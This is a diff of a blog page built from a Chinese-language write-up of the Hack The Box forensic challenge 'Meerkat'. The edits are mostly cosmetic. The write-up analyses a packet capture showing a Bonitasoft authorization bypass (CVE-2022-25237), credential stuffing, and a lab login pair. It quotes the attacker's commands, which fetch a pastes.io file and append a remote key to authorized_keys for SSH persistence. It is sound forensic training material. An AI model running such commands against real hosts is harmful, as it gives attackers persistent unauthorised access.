@@ -155,7 +155,7 @@ This article does not have a corresponding language version
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>Posts</div><div class="sidebar-state-number">5</div>
+    <div>Posts</div><div class="sidebar-state-number">6</div>
   </div>
   <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
     <div>Categories</div>
@@ -165,7 +165,7 @@ This article does not have a corresponding language version
   </a>
   <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
     <div>Tags</div>
-    <div class="sidebar-state-number">5</div>
+    <div class="sidebar-state-number">6</div>
   </a>
 </div>
 <div class="sidebar-social"></div>
@@ -582,7 +582,7 @@ HTB-Meerkat
 </ol>
 <p>由分析題目提供的 <code>meerkat-alerts.json</code> 文件，可以知道 <code>ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)</code></p>
 <p>攻击者通过<code>CVE-2022-25237</code> 攻击 <code>Bonitasoft</code> 平台</p>
-<ol>
+<ol start="2">
 <li><strong>We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?</strong></li>
 </ol>
 <p>通过分析<code>meerkat-alerts.json</code>，可以知道被攻击机的IP为172.31.6.4，wireshark过滤</p>
@@ -622,12 +622,12 @@ HTB-Meerkat
 </span></span><span style="display:flex;"><span>Date: Thu, <span style="color:#ae81ff">19</span> Jan <span style="color:#ae81ff">2023</span> 15:31:34 GMT
 </span></span><span style="display:flex;"><span>Keep-Alive: timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>
 </span></span><span style="display:flex;"><span>Connection: keep-alive
-</span></span></code></pre></div><ol>
+</span></span></code></pre></div><ol start="3">
 <li><strong>Does the vulnerability exploited have a CVE assigned - and if so, which one?</strong></li>
 </ol>
 <p>由题一可以知道CVE为 <code>CVE-2022-25237</code></p>
 <p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-1.5mo5s7168c.webp" alt="image.png"></p>
-<ol>
+<ol start="4">
 <li><strong>Which string was appended to the API URL path to bypass the authorization filter by the attacker&rsquo;s exploit?</strong></li>
 </ol>
 <p>分析流量包，找到认证成功的流量</p>
@@ -642,7 +642,7 @@ HTB-Meerkat
 </span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary<span style="color:#f92672">=</span>f79968fcad082cab61a2fc649dab366c
 </span></span></code></pre></div><p>字符串为 <code>i18ntranslation</code></p>
 <p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-2.9ddbdfq1fy.webp" alt="image.png"></p>
-<ol>
+<ol start="5">
 <li><strong>How many combinations of usernames and passwords were used in the credential stuffing attack?</strong></li>
 </ol>
 <p>最后三条流量都是以seb.broom@forela.co.uk进行认证</p>
@@ -652,7 +652,7 @@ HTB-Meerkat
 </span></span><span style="display:flex;"><span>Running as user <span style="color:#e6db74">&#34;root&#34;</span> and group <span style="color:#e6db74">&#34;root&#34;</span>. This could be dangerous.
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">59</span>
 </span></span></code></pre></div><p>59条流量爆破，除去最后的三条，一共56条爆破</p>
-<ol>
+<ol start="6">
 <li><strong>Which username and password combination was successful?</strong></li>
 </ol>
 <p>由题四可知,使用 [<code>seb.broom@forela.co.uk](mailto:seb.broom@forela.co.uk):g0vernm3nt</code> 认证成功</p>
@@ -675,7 +675,7 @@ HTB-Meerkat
 </span></span><span style="display:flex;"><span>Date: Thu, <span style="color:#ae81ff">19</span> Jan <span style="color:#ae81ff">2023</span> 15:38:38 GMT
 </span></span><span style="display:flex;"><span>Keep-Alive: timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>
 </span></span><span style="display:flex;"><span>Connection: keep-alive
-</span></span></code></pre></div><ol>
+</span></span></code></pre></div><ol start="7">
 <li><strong>If any, which text sharing site did the attacker utilise?</strong></li>
 </ol>
 <p>wireshark 过滤器</p>
@@ -700,7 +700,7 @@ HTB-Meerkat
 </span></span><span style="display:flex;"><span>Connection: keep-alive
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;p&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;c&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;wget https://pastes.io/raw/bx5gcr0et8&#34;</span>,<span style="color:#e6db74">&#34;out&#34;</span>:<span style="color:#e6db74">&#34;--2023-01-19 15:38:52--  https://pastes.io/raw/bx5gcr0et8\nResolving pastes.io (pastes.io)... 66.29.132.145\nConnecting to pastes.io (pastes.io)|66.29.132.145|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 113 [text/plain]\nSaving to: \u2018bx5gcr0et8\u2019\n\n     0K                                                       100% 57.8M=0s\n\n2023-01-19 15:38:53 (57.8 MB/s) - \u2018bx5gcr0et8\u2019 saved [113/113]\n\n&#34;</span>,<span style="color:#e6db74">&#34;currentDate&#34;</span>:<span style="color:#e6db74">&#34;2023-01-19&#34;</span><span style="color:#f92672">}</span>
-</span></span></code></pre></div><ol>
+</span></span></code></pre></div><ol start="8">
 <li><strong>Please provide the filename of the public key used by the attacker to gain persistence on our host.</strong></li>
 </ol>
 <p>找到这个网站</p>
@@ -709,11 +709,11 @@ HTB-Meerkat
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys
 </span></span><span style="display:flex;"><span>sudo service ssh restart
 </span></span></code></pre></div><p><code>hffgra4unv</code> 就是<strong>主机上获得持久性的公钥的文件名</strong></p>
-<ol>
+<ol start="9">
 <li><strong>Can you confirm the file modified by the attacker to gain persistence?</strong></li>
 </ol>
 <p>由题8可知为了<strong>持久性而修改的文件为</strong>  <code>/home/ubuntu/.ssh/authorized_keys</code></p>
-<ol>
+<ol start="10">
 <li><strong>Can you confirm the MITRE technique ID of this type of persistence mechanism?</strong></li>
 </ol>
 <p><code>T1098.004</code>通过修改 SSH 的 <code>authorized_keys</code> 文件来维持对受害主机的持久访问权限</p>
@@ -732,7 +732,7 @@ HTB-Meerkat
     id="article-nav"
     data-aos="fade-up"
   ><div class="article-nav-link-wrap article-nav-link-left"><img
-              data-src="images/b.jpg"
+              data-src="images/a.jpg"
               data-sizes="auto"
               alt="HTB Pikaptcha"
               class="lazyload"
@@ -767,10 +767,10 @@ HTB-Meerkat
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;4.8k</span
+          >&nbsp;5.5k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;00:24</span>
+        <span class="icon-coffee">&nbsp;00:28</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -810,7 +810,7 @@ HTB-Meerkat
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>Posts</div><div class="sidebar-state-number">5</div>
+    <div>Posts</div><div class="sidebar-state-number">6</div>
   </div>
   <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
     <div>Categories</div>
@@ -820,7 +820,7 @@ HTB-Meerkat
   </a>
   <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
     <div>Tags</div>
-    <div class="sidebar-state-number">5</div>
+    <div class="sidebar-state-number">6</div>
   </a>
 </div>
 <div class="sidebar-social"></div>
